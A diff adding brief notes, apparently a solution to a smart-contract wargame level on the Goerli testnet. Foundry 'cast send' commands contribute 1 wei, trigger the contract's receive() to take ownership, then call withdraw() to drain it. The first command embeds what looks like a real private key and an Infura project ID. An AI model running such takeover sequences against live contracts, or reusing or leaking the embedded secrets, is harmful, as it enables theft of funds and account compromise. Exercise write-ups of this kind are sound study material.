@@ -1,0 +1,26 @@
+1. Send tx to call contribute()
+
+cast send 0x40c2E9004eba16ff587c230A1a4Cb52D206a3922 "contribute()" \
+--value 1wei \
+--rpc-url https://goerli.infura.io/v3/6bf928d2e56c4a4ea4a7403a6c4d5033 \
+--private-key 0xfd7af2aa395aed437d9b3baa99d96a63d098e92eadb67e374cc875561f7fb767 \
+--gas-limit 500000 \
+--gas-price 5gwei
+
+
+# 100000000000000 = 0.0001 ether
+
+2. Send tx to call receive()
+cast send 0x... \
+--value 1wei \
+--rpc-url https://goerli.infura.io/v3/{key} \
+--private-key {key} \
+--gas-limit 200000 \
+--gas-price 5gwei
+
+3. 
+cast send 0x... "withdraw()" \
+--rpc-url https://goerli.infura.io/v3/{key} \
+--private-key {key} \
+--gas-limit 500000 \
+--gas-price 5gwei
